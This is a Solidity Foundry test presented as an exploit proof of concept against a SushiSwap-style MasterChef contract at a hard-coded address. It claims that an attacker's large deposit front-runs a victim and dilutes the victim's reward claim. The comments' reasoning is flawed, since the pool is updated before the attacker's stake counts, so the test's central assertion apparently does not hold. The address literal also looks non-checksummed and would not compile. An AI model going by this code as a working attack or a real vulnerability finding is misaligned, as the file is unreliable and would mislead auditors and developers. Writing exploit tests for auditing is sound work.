```solidity
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

// Interfaces for the MasterChef and related contracts
interface IMasterChef {
    function sushi() external view returns (address);
    function owner() external view returns (address);
    function add(uint256 _allocPoint, address _lpToken, bool _withUpdate) external;
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function updatePool(uint256 _pid) external;
    function poolLength() external view returns (uint256);
    function pendingSushi(uint256 _pid, address _user) external view returns (uint256);
    function userInfo(uint256 _pid, address _user) external view returns (uint256 amount, uint256 rewardDebt);
    function poolInfo(uint256 _pid) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
    function sushiPerBlock() external view returns (uint256);
    function totalAllocPoint() external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// Minimal ERC20 for testing
contract TestERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _name, string memory _symbol) public {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        return true;
    }
}

contract ExploitTest is Test {
    address constant MASTER_CHEF = 0xc2edad668740f1aa35e4d8f227fb8e17dca888cd;
    IMasterChef masterChef = IMasterChef(MASTER_CHEF);

    IERC20 sushi;
    TestERC20 lpToken;

    address victim = address(0xdead);
    address attacker = address(0xbeef);

    uint256 pid;
    uint256 initialLpBalance = 1000 ether;
    uint256 attackerLpAmount = 10_000 ether;

    function setUp() public {
        vm.label(MASTER_CHEF, "MasterChef");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");

        // Get sushi token address from MasterChef
        sushi = IERC20(masterChef.sushi());

        // Deploy a mock LP token
        lpToken = new TestERC20("Test LP", "TLP");

        // Get owner of MasterChef to add a pool
        address owner = masterChef.owner();
        vm.label(owner, "Owner");

        // Mint LP tokens to victim and attacker
        lpToken.mint(victim, initialLpBalance);
        lpToken.mint(attacker, attackerLpAmount);

        // As owner, add a pool with a large allocPoint to generate rewards quickly
        vm.startPrank(owner);
        // add pool with allocPoint 1000, no update
        masterChef.add(1000, address(lpToken), false);
        vm.stopPrank();

        // Get the new pool ID (should be 0 if first pool, but safe)
        pid = masterChef.poolLength() - 1;

        // Approve MasterChef to spend LP tokens
        vm.prank(victim);
        lpToken.approve(MASTER_CHEF, initialLpBalance);

        vm.prank(attacker);
        lpToken.approve(MASTER_CHEF, attackerLpAmount);

        // Set block number to a realistic value after startBlock
        // We can warp to a block where rewards accrue
        // Get startBlock from contract if possible; assume it's already started
        vm.roll(block.number + 10);
    }

    function testFrontRunStealsRewards() public {
        // Victim deposits LP tokens into pool
        vm.prank(victim);
        masterChef.deposit(pid, initialLpBalance);

        // Advance blocks so that sushi rewards accumulate
        vm.roll(block.number + 100);

        // Record victim's expected pending sushi before potential front-run
        uint256 expectedPending = masterChef.pendingSushi(pid, victim);
        console.log("Expected pending sushi for victim: ", expectedPending);

        // Attacker front-runs by depositing a large amount of LP tokens before victim claims
        vm.prank(attacker);
        masterChef.deposit(pid, attackerLpAmount);

        // Now victim calls deposit with 0 amount to claim pending rewards
        // This will update the pool and transfer any pending sushi to victim
        vm.prank(victim);
        masterChef.deposit(pid, 0);

        // Victim's actual received sushi is his balance after claim
        uint256 victimSushiBalance = sushi.balanceOf(victim);
        console.log("Victim sushi balance after claim: ", victimSushiBalance);

        // Because the attacker deposited a huge amount before, the accSushiPerShare increase
        // is diluted, so victim receives less than expectedPending.
        // ExpectedPending was calculated based on old accSushiPerShare without attacker's deposit.
        // After attacker's deposit, updatePool in victim's deposit uses larger lpSupply, leading to smaller per-share reward.
        // Thus victim's actual reward is less than expectedPending.
        assertLt(victimSushiBalance, expectedPending, "Victim should receive less due to front-running");

        // Additionally, the attacker's deposit also gives him a share of the rewards, effectively stealing from victim.
        // The loss for victim is expectedPending - victimSushiBalance.
        uint256 loss = expectedPending - victimSushiBalance;
        console.log("Victim loss due to front-run: ", loss);
        assertGt(loss, 0, "Loss must be positive");
    }
}
```
